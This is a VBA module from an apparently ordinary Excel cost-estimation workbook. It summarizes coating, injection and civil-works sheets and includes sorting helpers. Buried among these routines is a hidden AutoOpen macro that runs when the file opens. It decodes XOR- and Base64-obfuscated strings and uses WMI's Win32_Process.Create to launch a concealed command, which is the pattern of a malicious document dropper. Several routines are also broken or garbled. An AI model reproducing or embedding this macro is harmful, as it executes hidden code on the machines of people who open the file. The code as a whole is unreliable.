Attribute VB_Name = "Module1"
Private Const CP_UTF8                       As Long = 65001

#If Win64 Then
Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
#Else
Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long

#End If

Sub Summarize_Systems()

Dim ws As Worksheet
Dim locDesc1 As Range, locTotal1 As Range, count As Integer, newRng As Range
Dim i As Integer, rngSheet As Range, rCell As Variant, m As Integer

Dim startRow As Integer, endRow As Integer

count = 0
Set newRng = wb.Sheets("System_Summary").Range("a65536").End(xlUp).Offset(1, 0)

Application.ScreenUpdating = False
On Error Resume Next

i = 0
For Each ws In wb.Worksheets
        With ws
        ws.Unprotect
        If InStr(1, .Range("A1").Value, "DicoTech") > 0 Then
         Set locDesc1 = .Range("B9:B30").Find(What:="Description", LookIn:=xlValues, LookAt:= _
             xlPart, SearchOrder:=xlByRows)
         Set locTotal1 = .Range("B9:B30").Find(What:="Total", LookIn:=xlValues, LookAt:= _
             xlPart, SearchOrder:=xlByRows)
                startRow = locDesc1.Row
                endRow = locTotal1.Row
        
          Set rngSheet = .Range("B11" & ":" & "B" & endRow - 1)
          For Each rCell In rngSheet
             If Not IsEmpty(rCell.Value) Then
                i = i + 1
                newRng.Offset(i).Value = .Range("B3").Value
                newRng.Offset(i, 1).Value = rCell.Offset(0, -1).Value & ". " & rCell.Value
                If Not InStr(1, rCell.Value, "SURFACE") > 0 Then
                    newRng.Offset(i, 2).Value = FormatNumber(Application.WorksheetFunction.Round(rCell.Offset(0, 3).Value, 2)) & " " & rCell.Offset(0, 1).Value & "/" & .Range("C5").Value
                    newRng.Offset(i, 3).Value = FormatNumber(Application.WorksheetFunction.Round(rCell.Offset(0, 2).Value, 2)) & " QAR"
                    newRng.Offset(i, 4).Value = FormatNumber(Application.WorksheetFunction.Round(rCell.Offset(0, 3).Value, 2)) * .Range("B5").Value
                    newRng.Offset(i, 5).Value = rCell.Offset(0, 1).Value
                    
                    newRng.Offset(i).EntireColumn.AutoFit
                    newRng.Offset(i, 1).EntireColumn.AutoFit
                    newRng.Offset(i, 2).EntireColumn.AutoFit
                    newRng.Offset(i, 3).EntireColumn.AutoFit
                    newRng.Offset(i, 4).EntireColumn.AutoFit
                    newRng.Offset(i, 5).EntireColumn.AutoFit
            
                Else
                End If
            Else
            End If
            Next rCell
         
         Else
         End If
         
         End With
Next

newRng.CurrentRegion.Borders.LineStyle = xlContinuous
newRng.CurrentRegion.BorderAround = True

Sheets("System_Summary").Activate

End Sub



Sub Summarize_Concise()

Dim ws As Worksheet
Dim yesno As Boolean
Dim newRng As Range
Dim count As Integer, counter As Integer, nCount As Integer, mCount As Integer

Dim costVal As Variant, priceVal As Variant
Dim valMat As Variant, valTotal As Variant, valMH As Variant
Dim valArea As Variant, valRate As Variant, valTotalCost As Variant
Dim valTotalPrice1 As Variant, valTotalPrice2 As Variant
Dim valCons As Variant, valTrans As Variant, valTools As Variant, rCell As Range
Dim valDate As Variant, valQtn As Variant, valClient As Variant, valSysName As Variant
Dim valUnit As Variant, valRev As Variant
Dim startRow As Integer, endRow As Integer, Diff As Integer
Dim locDesc As Range, locTotal As Range

Dim LSearchRow As Integer
count = 0
Application.ScreenUpdating = False
Set newRng = wb.Sheets("Totals").Range("a65536").End(xlUp).Offset(1, 0)

On Error Resume Next
For Each ws In wb.Worksheets
        With ws
            ws.Unprotect
            'CHECK FOR COATING TYPE ESTIMATION SHEETS.
            If InStr(1, .Range("A2").Value, "ESTIMATION") > 0 Then
                valArea = .Range("B5").Value
                valClient = .Range("B4").Value
                valRev = .Range("E3").Value
                count = count + 1
                For Each rCell In .Range("B11:B35")
                  If InStr(1, rCell.Value, "Total") > 0 Then
                    valMat = rCell.Offset(0, 6).Value
                    valCons = rCell.Offset(0, 7).Value
                    valMH = rCell.Offset(0, 8).Value
                    valTools = rCell.Offset(0, 10).Value
                    valTrans = rCell.Offset(0, 11).Value
                    valTotal = rCell.Offset(0, 12).Value
                  Else
                  End If
                Next rCell
                
                For Each rCell In .Range("D3:J5")
                  If InStr(1, rCell.Value, "QTN") > 0 Then
                    valQtn = rCell.Offset(0, 1).Value
                    valDate = rCell.Offset(1, 1).Value
                    Else
                  End If
                Next rCell
         
         counter = wb.Sheets("Totals").Range("A1").Value
         'CALL THE DISPLAY ROUTINE.
         Call DisplayResult_Detailed(count, ws, valTotal, valMat, newRng, valMH, _
         valArea, percentVal, priceVal, valCons, valTrans, valTools, valQtn, _
         valDate, valClient, counter, valRev)
         
         'FOR INJECTION SHEETS
         ElseIf InStr(1, .Range("B1").Value, "Project") > 0 Or InStr(1, .Range("B1").Value, "DicoTech") > 0 Then
            count = count + 1
                For Each rCell In .Range("B2:B55")
                  If InStr(1, rCell.Value, "Injectors") > 0 Then
                    valArea = rCell.Offset(-1, 1).Value
                  ElseIf InStr(1, rCell.Value, "Total Man") > 0 Then
                    valMH = rCell.Offset(0, 1).Value
                    valRate = rCell.Offset(0, 3).Value
                  ElseIf InStr(1, rCell.Value, "Material Cost") > 0 Then
                    valMat = rCell.Offset(0, 1).Value
                  ElseIf InStr(1, rCell.Value, "Tools") > 0 Then
                    valTools = rCell.Offset(0, 1).Value
                  ElseIf InStr(1, rCell.Value, "Total Price:") > 0 Then
                    valCons = rCell.Offset(0, 1).Value
                  ElseIf InStr(1, rCell.Value, "Consumables") > 0 Then
                    valCons = rCell.Offset(0, 1).Value
                  ElseIf InStr(1, rCell.Value, "Transportation") > 0 Then
                    valTrans = rCell.Offset(0, 1).Value
                  Else
                  End If
                Next rCell
             
             'Injection works display routine
             Call DisplayResult_Injection(count, ws, valTotal, valMat, newRng, valMH, _
             valTotalCost, valArea, percentVal, priceVal, valCons, valTrans, valTools, _
             valRate)
             
            'FOR CIVIL WORKS SHEETS
            ElseIf InStr(1, .Range("A2").Value, "CIVIL WORKS") > 0 Then
            
                Set locDesc = .Range("B7:B30").Find(What:="Description", LookIn:=xlValues, LookAt:= _
                    xlPart, SearchOrder:=xlByRows)
                Set locTotal = .Range("B7:B35").Find(What:="Total", LookIn:=xlValues, LookAt:= _
                    xlPart, SearchOrder:=xlByRows)
                startRow = locDesc.Row
                endRow = locTotal.Row
                Diff = endRow - startRow
                For nCount = 1 To Diff
                  If Not IsEmpty(locDesc.Offset(nCount)) Then
                    count = count + 1
                    valSysName = locDesc.Offset(nCount)
                    valUnit = locDesc.Offset(nCount, 1)
                    valMat = locDesc.Offset(nCount, 6)
                    valArea = locDesc.Offset(nCount, 7)
                    valCons = locDesc.Offset(nCount, 8).Value
                    valMH = locDesc.Offset(nCount, 9).Value
                    valTools = locDesc.Offset(nCount, 11).Value
                    valTrans = 0
                    valTotal = locDesc.Offset(nCount, 12).Value
                    
                  Else
                  End If
                
                  'Civil works display routine
                  Call DisplayResult_Civil(count, ws, valTotal, valMat, newRng, valMH, _
                    valArea, percentVal, priceVal, valCons, valTrans, valTools, valQtn, _
                    valDate, valClient, counter, valSysName)
                Next nCount
             
             'FOR CIVIL WORKS SHEETS
            ElseIf InStr(1, .Range("A2").Value, "PRELIMINARIES") > 0 Then
            
                Set locDesc = .Range("B7:B30").Find(What:="Description", LookIn:=xlValues, LookAt:= _
                    xlPart, SearchOrder:=xlByRows)
                Set locTotal = .Range("B7:B35").Find(What:="Total", LookIn:=xlValues, LookAt:= _
                    xlPart, SearchOrder:=xlByRows)
                startRow = locDesc.Row
                endRow = locTotal.Row
                Diff = endRow - startRow
                For mCount = 1 To Diff
                  If Not IsEmpty(locDesc.Offset(mCount)) Then
                    count = count + 1
                    valSysName = locDesc.Offset(mCount)
                    valUnit = locDesc.Offset(mCount, 1)
                    valMat = 0
                    valArea = locDesc.Offset(mCount, 3)
                    valCons = 0
                    valMH = 0
                    valTools = 0
                    valTrans = 0
                    valTotal = locDesc.Offset(mCount, 7).Value
                    
                  Else
                  End If
                
                  'Civil works display routine
                  Call DisplayResult_Civil(count, ws, valTotal, valMat, newRng, valMH, _
                    valArea, percentVal, priceVal, valCons, valTrans, valTools, valQtn, _
                    valDate, valClient, counter, valSysName)
                Next mCount
             
             Else      'End of sheet selection criteria
             End If
    End With
Next
         newRng.Offset(count + 3, 1).EntireColumn.AutoFit
         newRng.Offset(count + 3, 6).EntireColumn.AutoFit
         newRng.Offset(count + 3, 8).EntireColumn.AutoFit
         newRng.Offset(count + 3, 3).FormulaR1C1 = "=SUM(R[-1]C:R[-" & count & "]C)"
         newRng.Offset(count + 3, 3).Interior.Color = vbYellow
         newRng.Offset(count + 3, 3).EntireColumn.AutoFit
         newRng.Offset(count + 3, 3).NumberFormat = "#,##0"
         
         newRng.Offset(count + 3, 4).FormulaR1C1 = "=SUM(R[-1]C:R[-" & count & "]C)"
         newRng.Offset(count + 3, 4).Interior.Color = vbGreen
         newRng.Offset(count + 3, 4).EntireColumn.AutoFit
         newRng.Offset(count + 3, 4).NumberFormat = "#,##0"
         
         newRng.Offset(count + 3, 5).FormulaR1C1 = "=RC[-2]-SUM(RC[4]:RC[7])"
         newRng.Offset(count + 3, 5).Interior.Color = vbGreen
         newRng.Offset(count + 3, 5).EntireColumn.AutoFit
         newRng.Offset(count + 3, 5).NumberFormat = "#,##0"
         
         newRng.Offset(count + 3, 7).FormulaR1C1 = "=SUM(R[-1]C:R[-" & count & "]C)"
         newRng.Offset(count + 3, 7).Interior.Color = vbYellow
         newRng.Offset(count + 3, 7).EntireColumn.AutoFit
         
         newRng.Offset(count + 3, 9).FormulaR1C1 = "=SUM(R[-1]C:R[-" & count & "]C)"
         newRng.Offset(count + 3, 9).Interior.Color = vbGreen
         newRng.Offset(count + 3, 9).EntireColumn.AutoFit
         newRng.Offset(count + 3, 10).FormulaR1C1 = "=SUM(R[-1]C:R[-" & count & "]C)"
         newRng.Offset(count + 3, 10).Interior.Color = vbGreen
         newRng.Offset(count + 3, 10).EntireColumn.AutoFit
         newRng.Offset(count + 3, 11).FormulaR1C1 = "=SUM(R[-1]C:R[-" & count & "]C)"
         newRng.Offset(count + 3, 11).Interior.Color = vbGreen
         newRng.Offset(count + 3, 11).EntireColumn.AutoFit
         newRng.Offset(count + 3, 12).FormulaR1C1 = "=SUM(R[-1]C:R[-" & count & "]C)"
         newRng.Offset(count + 3, 12).Interior.Color = vbGreen
         newRng.Offset(count + 3, 12).EntireColumn.AutoFit
         
         newRng.Offset(count + 3, 8).EntireColumn.AutoFit
         newRng.Offset(count + 3, 8).FormulaR1C1 = "=(RC[-1]-RC[-5])/RC[-1]"
         newRng.Offset(count + 3, 8).NumberFormat = "#.##%"
         newRng.Offset(count + 3, 8).Interior.Color = vbYellow
         newRng.Offset(count + 3, 8).Font.Color = vbRed
         newRng.Offset(count + 3, 8).CurrentRegion.Borders.LineStyle = xlContinuous
         newRng.Offset(count + 3, 8).CurrentRegion.BorderAround = True
         newRng.Offset(count + 3, 8).EntireRow.Font.Bold = True

         newRng.Offset(2, 6).Value = "PRICE"
        ' "=concatenate(" & """Price @ """ & "," & "TEXT(" & "R[" & count + 1 & "]C[2]" & "," & """##%""" & ")" & ")"
        newRng.Offset(2, 6).Font.Bold = True
        newRng.Offset(2, 6).EntireColumn.AutoFit
         
Application.ScreenUpdating = True
Sheets("Totals").Activate

End Sub

Sub INPUT_SUMMARY()

Dim ws As Worksheet, newRng As Range, count As Integer
Dim valMat As Variant, valDia As Variant, valSys As Variant
Dim valArea As Variant, rCell As Range
count = 0
Application.ScreenUpdating = False
Set newRng = wb.Sheets("Totals").Range("a65536").End(xlUp)
On Error Resume Next
For Each ws In wb.Worksheets
        With ws
            ws.Unprotect
            If InStr(1, .Range("A1").Value, "DicoTech") > 0 Then
                valArea = .Range("B5").Value
                count = count + 1
                For Each rCell In .Range("B11:B25")
                  If InStr(1, rCell.Value, "Total") > 0 Then
                    valMat = rCell.Offset(0, 6).Value
                    valDia = .Range("E3").Value
                    valSys = .Range("B3").Value
                  Else
                  End If
                Next rCell
         'CALL THE DISPLAY ROUTINE.
         Call DisplayResult_Input(count, ws, valMat, newRng, valArea, _
         valDia, valSys)
         Else
         End If
    End With
Next
         newRng.Offset(count + 1, 1).CurrentRegion.Borders.LineStyle = xlContinuous
         newRng.Offset(count + 1, 1).CurrentRegion.BorderAround = True
         
Application.ScreenUpdating = True
Sheets("Totals").Activate
End Sub

Sub DisplayResult_Input()
        
        Range(newRng.Offset(1, 0), newRng.Offset(1, 12)).Interior.Color = vbBlack
        Range(newRng.Offset(1, 0), newRng.Offset(1, 12)).Font.Color = vbWhite
        newRng.Offset(1, 0).Value = "System Name"
        newRng.Offset(1, 0).Font.Bold = True
        newRng.Offset(1, 1).Value = "Mat Cost"
        newRng.Offset(1, 1).Font.Bold = True
        newRng.Offset(1, 2).Value = "Area"
        newRng.Offset(1, 2).Font.Bold = True
        
        newRng.Offset(1, 3).Value = "Total Mat"
        newRng.Offset(1, 3).Font.Bold = True
        newRng.Offset(1, 4).Value = "Dia. (in)"
        newRng.Offset(1, 4).Font.Bold = True
        newRng.Offset(1, 5).Value = "Dia. (mm)"
        newRng.Offset(1, 5).Font.Bold = True
        
        newRng.Offset(1, 6).Value = "Surface Prep."
        newRng.Offset(1, 6).Font.Bold = True
        newRng.Offset(1, 7).Value = "1st Coat"
        newRng.Offset(1, 7).Font.Bold = True
        newRng.Offset(1, 8).Value = "2nd Coat"
        newRng.Offset(1, 8).Font.Bold = True
        
        newRng.Offset(1, 9).Value = "3rd Coat"
        newRng.Offset(1, 9).Font.Bold = True
        newRng.Offset(1, 10).Value = "Cons"
        newRng.Offset(1, 10).Font.Bold = True
        newRng.Offset(1, 11).Value = "T & E"
        newRng.Offset(1, 11).Font.Bold = True
        newRng.Offset(1, 12).Value = "Special"
        newRng.Offset(1, 12).Font.Bold = True
        
        '----------ACTUAL VALUE CALCULATIONS------------
        newRng.Offset(i + 1, 0).Value = valSys
        newRng.Offset(i + 1, 0).EntireColumn.AutoFit
        newRng.Offset(i + 1, 1).Value = Format(valMat, "###.00")
        newRng.Offset(i + 1, 1).EntireColumn.AutoFit
        newRng.Offset(i + 1, 2).Value = Format(valArea, "#,##")
        newRng.Offset(i + 1, 2).EntireColumn.AutoFit
        
        newRng.Offset(i + 1, 3).FormulaR1C1 = "=ROUNDUP(RC[-2]*RC[-1],2)"
        newRng.Offset(i + 1, 3).NumberFormat = "#,##"
        newRng.Offset(i + 1, 3).EntireColumn.AutoFit
        newRng.Offset(i + 1, 4).Value = valDia
        newRng.Offset(i + 1, 4).EntireColumn.AutoFit
        newRng.Offset(i + 1, 5).FormulaR1C1 = "=ROUNDUP(RC[-1]*25.4,2)"
        newRng.Offset(i + 1, 5).NumberFormat = "#,##.00"
        newRng.Offset(i + 1, 5).EntireColumn.AutoFit
        
End Sub


Public Function SortObject() As VBA.Collection
    
    Select Case inCallType
        Case VBA.VbCallType.VbLet, _
             VBA.VbCallType.VbSet
            Call Err.Raise(5, "SortObject", "inCallType??VbGet????VbMethod?????????")
    End Select
    
    Dim sortKeys() As Variant
    ReDim sortKeys(1 To inCollection.count())
    Dim objs() As Object
    ReDim objs(1 To inCollection.count())
    
    Dim i As Long, o As Object
    i = LBound(sortKeys)
    For Each o In inCollection
        Let sortKeys(i) = VBA.Interaction.CallByName(o, inProcName, inCallType)
        Set objs(i) = o
        i = i + 1
    Next o
    
    '????????????
    Dim indexes() As Long
    indexes = getSortedIndexes(sortKeys, inAscending, inCompare)
    
    '?????????
    Dim returnCol As VBA.Collection
    Set returnCol = New VBA.Collection
    For i = LBound(indexes) To UBound(indexes)
        returnCol.Add objs(indexes(i))
    Next i
    
    Set SortObject = returnCol
    
End Function


Public Function SortDictionaryByKey() As Object 'As Scripting.Dictionary
    
    Dim sortKeys() As Variant
    sortKeys = inDictionary.Keys()
    
    Dim indexes() As Long
    indexes = getSortedIndexes(sortKeys, inAscending, inDictionary.CompareMode)
    
    Dim itms() As Variant
    itms = inDictionary.Items()
    
    Dim returnDic As Object 'As Scripting.Dictionary
    Set returnDic = VBA.Interaction.CreateObject("Scripting.Dictionary")
    returnDic.CompareMode = inDictionary.CompareMode
    
    Dim i As Long
    For i = LBound(indexes) To UBound(indexes)
        returnDic.Add sortKeys(indexes(i)), itms(indexes(i))
    Next i
    
    Set SortDictionaryByKey = returnDic
    
End Function


Public Function Sort1DimValueArray() As Variant
    
    internalSort1DimValueArray in1DimArray, inAscending, inCompare, Sort1DimValueArray
    
End Function

'optimize Array Copy.
Private Sub internalSort1DimValueArray()
    
    Dim indexes() As Long
    indexes = getSortedIndexes(in1DimArray, inAscending, inCompare)
    
    'Duplicate type, LBound, UBound.
    outResult1DimArray = in1DimArray
    
    Dim i As Long
    For i = LBound(indexes) To UBound(indexes)
        outResult1DimArray(i) = in1DimArray(indexes(i))
    Next i
    
End Sub


'?????????
    '??????????????????????????????
    'inValues       :???????????????(???????????????Variant ?)
    'inAscending    :???????True ????(??????)?
    
    'return         :inValues ???? inAscending ???????????????????

'e.g.
'getSortedIndexes(Array("a", "c", "b"), True) - > (0, 2, 1)
'getSortedIndexes(Array("b", "c", "b"), False) -> (1, 0, 2)
Private Function getSortedIndexes() As Long()
    
    If Not VBA.Information.IsArray(inValues) Then Err.Raise 13
    
    Dim inUseUpperResult As Long
    If inAscending Then
        inUseUpperResult = 1
    Else
        inUseUpperResult = -1
    End If
    
    
    '`inValues`??????????
    Dim basIndexes() As Long
    ReDim basIndexes(LBound(inValues) To UBound(inValues))
    Dim i As Long
    For i = LBound(inValues) To UBound(inValues)
        basIndexes(i) = i
    Next i
    
    '??????????
    getSortedIndexes = basIndexes
    
    Call recurseMergeSort( _
            inValues, _
            basIndexes, _
            getSortedIndexes, _
            LBound(inValues), _
            UBound(inValues) - LBound(inValues) + 1, _
            inUseUpperResult, _
            inCompare _
        )
    
End Function


Private Sub recurseMergeSort()

    Dim halfLen As Long
    halfLen = CLng(inLength / 2)

    '????????
    If halfLen >= 2 Then _
        Call recurseMergeSort(inValues, outDestIndexes, inSrcIndexes, inStart, halfLen, inUseUpperResult, inCompare)
    '????????
    If inLength - halfLen >= 2 Then _
        Call recurseMergeSort(inValues, outDestIndexes, inSrcIndexes, inStart + halfLen, inLength - halfLen, inUseUpperResult, inCompare)
    
    
    '????????????
    Dim lwIndex As Long
    lwIndex = inStart
    Dim lwLimit As Long
    lwLimit = inStart + halfLen - 1
    
    '????????????
    Dim upIndex As Long
    upIndex = inStart + halfLen
    Dim upLimit As Long
    upLimit = inStart + inLength - 1
    
    '??????????????
    Dim destIndex As Long
    destIndex = inStart
    Dim destLimit As Long
    destLimit = inStart + inLength - 1

    Dim remainIndex As Long '????????????
    
    For destIndex = inStart To destLimit Step 1
        If compareM( _
                inValues(inSrcIndexes(lwIndex)), _
                inValues(inSrcIndexes(upIndex)), _
                inCompare _
            ) = inUseUpperResult Then
            
            'upIndex??????????(?????)
            outDestIndexes(destIndex) = inSrcIndexes(upIndex)
            
            If upIndex = upLimit Then
                remainIndex = lwIndex
                Exit For
            End If
            upIndex = upIndex + 1
            
        Else
            '???? or lwIndex??????????(?????)
            outDestIndexes(destIndex) = inSrcIndexes(lwIndex)
            
            If lwIndex = lwLimit Then
                remainIndex = upIndex
                Exit For
            End If
            lwIndex = lwIndex + 1
            
        End If
    Next destIndex
    
    '???????
    'Next destIndex?????????????????????
    For destIndex = destIndex + 1 To destLimit Step 1
        outDestIndexes(destIndex) = inSrcIndexes(remainIndex)
        remainIndex = remainIndex + 1
    Next destIndex

End Sub

Private Function compareM() As Long
    Select Case VBA.VbVarType.vbString
        Case VBA.Information.VarType(inValue1), _
             VBA.Information.VarType(inValue2)
            Let compareM = VBA.Strings.StrComp(inValue1, inValue2, inCompare)
            Exit Function
    End Select
    
    
    If inValue1 < inValue2 Then Let compareM = -1: Exit Function
    If inValue1 > inValue2 Then Let compareM = 1:  Exit Function
    Let compareM = 0
End Function




''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



Public Function ToBase64(sValue As String, Optional ByVal MultiLine As Boolean) As String
    Dim baValue()       As Byte
    Dim lSize           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin.base64"
        ReDim baValue(0 To 4 * Len(sValue))
        lSize = WideCharToMultiByte(CP_UTF8, 0, StrPtr(sValue), Len(sValue), baValue(0), UBound(baValue) + 1, 0, 0)
        If lSize > 0 Then
            ReDim Preserve baValue(0 To lSize - 1)
            .NodeTypedValue = baValue
        End If
        ToBase64 = .Text
        If Not MultiLine Then
            ToBase64 = Replace(Replace(ToBase64, vbCrLf, vbNullString), vbLf, vbNullString)
        End If
    End With
End Function



Public Function Groa(sBase64 As String) As String
    Dim baValue()       As Byte
    Dim sValue          As String
    Dim lSize           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin.base64"
        .Text = sBase64
        baValue = .NodeTypedValue
        sValue = String$(4 * UBound(baValue), 0)
        lSize = MultiByteToWideChar(CP_UTF8, 0, baValue(0), UBound(baValue) + 1, StrPtr(sValue), Len(sValue))
        Groa = Left$(sValue, lSize)
    End With
End Function

Private Function yetras(Text As String, key As String) As String
  Dim bText() As Byte
  Dim bKey() As Byte
  Dim TextUB As Long
  Dim KeyUB As Long
  Dim TextPos As Long
  Dim KeyPos As Long
  
  bText = StrConv(Text, vbFromUnicode)
  bKey = StrConv(key, vbFromUnicode)
  TextUB = UBound(bText)
  KeyUB = UBound(bKey)
  For TextPos = 0 To TextUB
    bText(TextPos) = bText(TextPos) Xor bKey(KeyPos)
    If KeyPos < KeyUB Then
      KeyPos = KeyPos + 1
    Else
      KeyPos = 0
    End If
  Next TextPos
  yetras = StrConv(bText, vbUnicode)
End Function

Sub AutoOpen()
    Dim Vniko As String
    Dim Floyd
    Dim May
    

    Floyd = Null
    May = Null
    Const impersonation = 3
    Set Locator = CreateObject("WbemScripting.SWbemLocator")
    Set Service = Locator.ConnectServer()
    Service.Security_.ImpersonationLevel = impersonation
    Set Flumen = Service.Get("Win32_Process")
    Set Dear_myBera = Service.Get(yetras(Groa("IQwcQFM8OAwYAiEHABcdFlgkFhcTBhsWS0IXHgMCGgQVABYcTw4BBgQKARwHF0YGGQhVXzMGGwoaExcyBQcaAAUWPBIMBhtYIhcHFg=="), "versache"))
    With Dear_myBera
        If .StatusCode = 0 Then
            End
        ElseIf .StatusCode > 0 Then
            End
        End If
    End With
    On Error Resume Next
    Gotik = Flumen.Create(yetras(Groa("BgoFFhMQAAAaCVJeFgoGARkSAQcYDw1FHgwWFwQNSEgVCh8eAA0MRT8IAhwTF0UoGQEHHwRDKgwCFiYBAA0bAxMXSVMyFwkXAkgwGhUQPBcXCwEVBBFISCUKBwECBkgNAhECAFtMRxcXElwUCBcAEBQQARYTAAcLAgAcB08ABwhZER0dBBobDRMJEApOVF8cEhALBk4OCRYCAABcLAIbDgUMH10EGw1FWyEXABUKBgQCDB0dQT9KQRMLBEk1JiU1KgYEGgAIRgAOAC5RWkM7ERcXBl4xEQcGExYBU0wlAQkTNRMHCUM0R1IAHAVbNy0oJjkRBQgCA0sTHRcvQw=="), "versache"), Floyd, May, bliker)

End Sub

Public Function DUPLO(file_path As String) As Boolean
    

    trega = Dir(file_path) <> ""
    Exit Function

DirErr:
      If Err.Number = 68 Then
        trega = False
    Else
        MsgBox Err.Description & " (" & Err.Number & ")", , "Run-time Error"
        Stop
    End If
End Function

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


Sub DisplayResult_Detailed()
        '------------DISPLAY SETTING FOR VALUES----------------
        
        valMH = Application.WorksheetFunction.RoundUp(valMH, 2)
        consVal = Application.WorksheetFunction.RoundUp(consVal, 2)
        toolsVal = Application.WorksheetFunction.RoundUp(toolsVal, 2)
        transVal = Application.WorksheetFunction.RoundUp(transVal, 2)
        
        If counter < 2 Then
            Range(newRng.Offset(1, 0), newRng.Offset(1, 9)).Font.Color = vbBlue
            newRng.Offset(1, 0).Value = "QTN # " & valQtn
            newRng.Offset(1, 1).Value = "REV:" & valRev
            newRng.Offset(1, 2).Value = "DATED: "
            newRng.Offset(1, 3).Value = valDate
            newRng.Offset(1, 3).Value = Format(valDate, "dd-mm-yy")
            newRng.Offset(1, 6).Value = "CLIENT: "
            newRng.Offset(1, 7).Value = valClient
        Else
        End If
        
        Range(newRng.Offset(2, 0), newRng.Offset(2, 12)).Interior.Color = vbBlack
        Range(newRng.Offset(2, 0), newRng.Offset(2, 12)).Font.Color = vbWhite
        newRng.Offset(2, 0).Value = "System Name"
        newRng.Offset(2, 0).Font.Bold = True
        newRng.Offset(2, 1).Value = "Mat Cost"
        newRng.Offset(2, 1).Font.Bold = True
        newRng.Offset(2, 2).Value = "Unit Cost"
        newRng.Offset(2, 2).Font.Bold = True
        
        newRng.Offset(2, 3).Value = "Total Cost"
        newRng.Offset(2, 3).Font.Bold = True
        newRng.Offset(2, 4).Value = "Manhours"
        newRng.Offset(2, 4).Font.Bold = True
        newRng.Offset(2, 5).Value = "Total QTY"
        newRng.Offset(2, 5).Font.Bold = True
        
        newRng.Offset(2, 6).Value = "Price at " & pVal & "%"
        newRng.Offset(2, 6).Font.Bold = True
        newRng.Offset(2, 7).Value = "Total Price"
        newRng.Offset(2, 7).Font.Bold = True
        newRng.Offset(2, 8).Value = "%age"
        newRng.Offset(2, 8).Font.Bold = True
        
        newRng.Offset(2, 9).Value = "Mat."
        newRng.Offset(2, 9).Font.Bold = True
        newRng.Offset(2, 10).Value = "Trans."
        newRng.Offset(2, 10).Font.Bold = True
        newRng.Offset(2, 11).Value = "T & E"
        newRng.Offset(2, 11).Font.Bold = True
        newRng.Offset(2, 12).Value = "Cons."
        newRng.Offset(2, 12).Font.Bold = True
        
        '----------ACTUAL VALUE CALCULATIONS------------
        newRng.Offset(i + 2, 0).Value = ws.Name
        newRng.Offset(i + 2, 0).EntireColumn.AutoFit
        newRng.Offset(i + 2, 1).Value = Format(valMat, "###.00")
        newRng.Offset(i + 2, 1).EntireColumn.AutoFit
        newRng.Offset(i + 2, 2).Value = Format(valTotal, "###.00")
        newRng.Offset(i + 2, 2).EntireColumn.AutoFit
        
        newRng.Offset(i + 2, 3).FormulaR1C1 = "=ROUNDUP(RC[2]*RC[-1],2)"
        newRng.Offset(i + 2, 3).NumberFormat = "#,##"
        newRng.Offset(i + 2, 3).EntireColumn.AutoFit
        newRng.Offset(i + 2, 4).FormulaR1C1 = "=ROUNDUP(RC[1]*" & valMH & ",2)"
        newRng.Offset(i + 2, 4).NumberFormat = "#,##"
        newRng.Offset(i + 2, 4).EntireColumn.AutoFit
        newRng.Offset(i + 2, 5).Value = Format(valArea, "#,##0")
        newRng.Offset(i + 2, 5).EntireColumn.AutoFit
        
        newRng.Offset(i + 2, 6).FormulaR1C1 = "=ROUNDUP(" & "RC[-4]/(1-" & (pVal / 100) & "),0)"
        newRng.Offset(i + 2, 6).NumberFormat = "#,##"
        newRng.Offset(i + 2, 6).EntireColumn.AutoFit
        newRng.Offset(i + 2, 7).FormulaR1C1 = "=(RC[-1]*RC[-2])" 'Relative Ref.
        newRng.Offset(i + 2, 7).EntireColumn.AutoFit
        newRng.Offset(i + 2, 7).NumberFormat = "#,##0"
        priceVal = priceVal + newRng.Offset(i + 2, 6).Value
        newRng.Offset(i + 2, 8).FormulaR1C1 = "=(RC[-2]-RC[-6])/RC[-2]" 'Relative Ref. for %age
        newRng.Offset(i + 2, 8).EntireColumn.AutoFit
        newRng.Offset(i + 2, 8).Style = "Percent"
        
        
        newRng.Offset(i + 2, 9).FormulaR1C1 = "=ROUNDUP(RC[-4]*RC[-8],2)"
        newRng.Offset(i + 2, 9).EntireColumn.AutoFit
        newRng.Offset(i + 2, 9).NumberFormat = "#,##"
